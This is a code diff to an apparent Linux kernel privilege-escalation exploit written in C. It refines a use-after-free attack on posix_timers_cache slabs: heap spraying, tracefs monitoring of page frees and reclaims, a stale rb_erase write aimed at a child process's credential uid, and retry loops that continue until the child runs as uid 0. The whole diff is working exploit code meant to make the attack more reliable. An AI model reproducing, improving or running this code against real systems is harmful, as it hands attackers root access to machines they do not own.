@@ -2151,6 +2854,31 @@ static void run_plant(unsigned long long target, int tag, int mode,
     }
     V = kept[VICTIM_IDX];
     vslab = V & SLAB_MASK;
+    /*
+     * The victim must be a real posix_timers_cache object, i.e. its in-slab
+     * offset is a whole number of timer_alloc bytes.  The slab base itself is
+     * NOT timer_alloc aligned (31 * 264 = 8184 leaves 8 bytes of tail in an
+     * 8K slab), so only the offset may be checked.  A failed check means
+     * SLAB_SIZE is the wrong power of two for this kernel: the payload would
+     * be sprayed up to half a slab away from the stale node, the erase would
+     * find a zeroed node and silently write nothing, and the child would
+     * wake with its original uid while the plant still reports success.
+     */
+    if (((V & SLAB_OFF_MASK) % TIMER_ALLOC) != 0)
+    {
+        trace_stop();
+        kill(T, SIGKILL);
+        waitpid(T, NULL, 0);
+        logf("[-] plant%d victim offset %#llx is not a multiple of"
+             " timer_alloc=%#llx (order=%u size=%#llx): wrong slab geometry"
+             " for this kernel\n", tag, V & SLAB_OFF_MASK,
+             (unsigned long long)TIMER_ALLOC, SLAB_ORDER,
+             (unsigned long long)SLAB_SIZE);
+        /* Nothing was written and the trigger was reaped, so a fresh plant
+         * is safe; a transient mis-scan clears on the retry. */
+        res->retry = 1;
+        return;
+    }
     for (int i = 0; i < nkeep; i++)
         if ((kept[i] & SLAB_MASK) == vslab)
             slab_own++;
@@ -2329,6 +3057,23 @@ static void run_plant(unsigned long long target, int tag, int mode,
     atomic_store(&g_burst, 0);
     atomic_store(&g_burst2, 0);
     atomic_store(&g_stop_spray, 0);
+    atomic_store(&g_free_seen, 0);
+    atomic_store(&g_send_ok, 0);
+    atomic_store(&g_send_err, 0);
+    /*
+     * Start the trace drainer here, not after the zombie: wait_zombie() and
+     * the PCP slabinfo gate can together take seconds, and the ring cannot
+     * hold the whole free -> reclaim sequence for that long.  slab_pfn is
+     * already known at this point, so the watcher can grep for it directly.
+     */
+    watch.raw = raw;
+    watch.pfn = slab_pfn;
+    watch.start_ms = now_ms();
+    atomic_store(&watch.stop, 0);
+    atomic_store(&watch.force_free, 0);
+    atomic_store(&watch.free_seen, 0);
+    atomic_store(&watch.hit, 0);
+    pthread_create(&watch_th, NULL, reclaim_watcher, &watch);
     {
         int per = g_pool_n / SPRAY_THREADS;
 
@@ -2369,6 +3114,7 @@ static void run_plant(unsigned long long target, int tag, int mode,
         atomic_store(&g_burst2, 1);
         for (int i = 0; i < SPRAY_THREADS; i++)
             pthread_join(th[i], NULL);
+        stop_watch(&watch, watch_th);
         trace_stop();
         logf("[-] plant%d no zombie; holding child\n", tag);
         g_held++;
@@ -2382,6 +3128,7 @@ static void run_plant(unsigned long long target, int tag, int mode,
         atomic_store(&g_burst2, 1);
         for (int i = 0; i < SPRAY_THREADS; i++)
             pthread_join(th[i], NULL);
+        stop_watch(&watch, watch_th);
         trace_stop();
         if (si.si_code == CLD_EXITED)
         {
@@ -2401,15 +3148,11 @@ static void run_plant(unsigned long long target, int tag, int mode,
     }
     atomic_store(&g_burst, 1);
     /*
-     * Phase 1 normally finishes before the target's exit path frees the
-     * slab.  Release phase 2 as soon as the zombie is visible so allocations
-     * are in flight no matter exactly when the free lands; the cleared
-     * trace ring makes any later page_free event unambiguous, and the scan
-     * below still releases phase 2 if it has not started yet.
-     *
-     * 5.15/6.1 (pcp_free) additionally gate on /proc/slabinfo: the PCP
-     * free path does emit mm_page_free, but waiting for the cache's active
-     * count to drop confirms the victim's timers are actually freed.
+     * Phase 1 starts before the target is released, so an early free is still
+     * covered.  For pcp_free kernels the /proc/slabinfo drop IS the free: the
+     * page can leave via the PCP lists without an mm_page_free that reaches
+     * tracefs.  Publish it to the watcher so phase 2 bursts at the confirmed
+     * free instead of waiting 14s for a trace event that may never arrive.
      */
     if (g_cfg.pcp_free)
     {
@@ -2419,36 +3162,29 @@ static void run_plant(unsigned long long target, int tag, int mode,
         while (slab_base > 0 && now > 0 &&
                now > slab_base - 2000 && now_ms() - t0 < 30000)
         {
-            usleep(200000);
+            /* 200ms polling added up to seconds of latency before the burst. */
+            usleep(20000);
             now = slab_active();
         }
         logf("[+] plant%d pcp reclaim go (slab %ld -> %ld, %ldms)\n",
              tag, slab_base, now, now_ms() - t0);
+        atomic_store(&watch.force_free, 1);
     }
     atomic_store(&g_burst2, 1);
     long t1 = now_ms();
-    int hit = 0;
 
-    while (!hit && now_ms() - t1 < 15000)
-    {
-        for (int cpu = 0; cpu < 8 && !hit; cpu++)
-        {
-            long m = read_fd(g_rawfd[cpu], raw, 32u << 20);
-
-            if (m <= 0)
-                continue;
-            scan_reclaim(raw, (size_t)m, slab_pfn, &free_seen, &hit);
-            if (free_seen)
-                atomic_store(&g_burst2, 1);
-        }
-        if (!hit)
-            usleep(50);
-    }
+    /* The watcher owns the raw fds while it runs; wait for its verdict. */
+    while (!atomic_load(&watch.hit) && now_ms() - t1 < 15000)
+        usleep(1000);
     atomic_store(&g_stop_spray, 1);
     atomic_store(&g_burst2, 1);
     for (int i = 0; i < SPRAY_THREADS; i++)
         pthread_join(th[i], NULL);
+    stop_watch(&watch, watch_th);
     trace_stop();
+    free_seen = atomic_load(&watch.free_seen);
+    int hit = atomic_load(&watch.hit);
+    /* One last pass over whatever the rings still hold after tracing stops. */
     for (int cpu = 0; cpu < 8 && !hit; cpu++)
     {
         long m = read_fd(g_rawfd[cpu], raw, 32u << 20);
@@ -2456,8 +3192,13 @@ static void run_plant(unsigned long long target, int tag, int mode,
         if (m > 0)
             scan_reclaim(raw, (size_t)m, slab_pfn, &free_seen, &hit);
     }
-    logf("[+] plant%d free_seen=%d burst hit=%d after %ldms\n",
-         tag, free_seen, hit, now_ms() - t1);
+    if (free_seen)
+        logf("[+] plant%d free at %ldms send ok=%ld err=%ld\n",
+             tag, watch.free_ms, atomic_load(&g_send_ok),
+             atomic_load(&g_send_err));
+    logf("[+] plant%d free_seen=%d burst hit=%d after %ldms send ok=%ld err=%ld\n",
+         tag, free_seen, hit, now_ms() - t1,
+         atomic_load(&g_send_ok), atomic_load(&g_send_err));
     if (!hit)
     {
         logf("[-] plant%d burst missed; holding zombie\n", tag);
@@ -2595,6 +3336,8 @@ static void run_probe(unsigned char *raw)
     }
     else
     {
+        if (n > 0)
+            explain_timer_scan(raw, (size_t)n, etid);
         logf("[-] probe victim not captured (recs=%d)\n", nrec);
     }
     kill(T, SIGKILL);
@@ -3115,7 +3858,7 @@ int main(int argc, char **argv)
         }
     }
 
-    pin(g_cpu);
+    g_cpu = pin_trigger_cpu(g_cpu);
     logf("[+] pid=%d cpu=%d mode shell=%d fake=%d probe=%d leak=%d ids=%d\n",
          getpid(), g_cpu, shell_mode, g_fake_stage, g_probe, leak_only,
          ids_only);
@@ -3183,6 +3926,10 @@ int main(int argc, char **argv)
         for (int a = 0; a < 3 && !r.ok; a++)
         {
             logf("[+] permissive plant attempt %d/3\n", a + 1);
+            /* Fresh queues per attempt: a retry that starts inside the
+             * previous attempt's full queues sends only EAGAIN and can never
+             * reclaim the freed slab. */
+            pool_reset();
             run_plant(0, 1, 0, &r, raw);
         }
         if (!r.ok)
@@ -3198,13 +3945,38 @@ int main(int argc, char **argv)
     if (!g_fake_stage)
     {
         struct plant_res r;
-        memset(&r, 0, sizeof(r));
-        for (int a = 0; a < 3 && !r.ok; a++)
+        int landed = 0;
+
+        for (int a = 0; a < 6 && !landed; a++)
         {
-            logf("[+] plant attempt %d/3\n", a + 1);
+            int uid;
+
+            memset(&r, 0, sizeof(r));
+            logf("[+] plant attempt %d/6\n", a + 1);
+            /* Same reason as the permissive path: each attempt needs empty
+             * queues, otherwise phase 1 fills them and the burst is all
+             * EAGAIN. */
+            pool_reset();
             run_plant(R + CRED_UID_OFF, 1, 0, &r, raw);
+            if (!r.ok)
+                continue;
+            /*
+             * run_plant() only proves that the victim slab was reclaimed and
+             * the target reaped; it cannot prove the stale rb_erase ran on
+             * the payload.  If the free lands after the phase-1 burst, the
+             * page is reclaimed again after the zombie, i.e. after the
+             * erase already passed.  The child's uid is the ground truth,
+             * so retry the whole plant until the write actually lands.
+             */
+            uid = proc_uid(C);
+            if (uid == 0)
+            {
+                landed = 1;
+                break;
+            }
+            logf("[!] plant %d left child uid=%d; retrying\n", a + 1, uid);
         }
-        if (!r.ok)
+        if (!landed)
             park_forever("no successful plant");
     }
     else
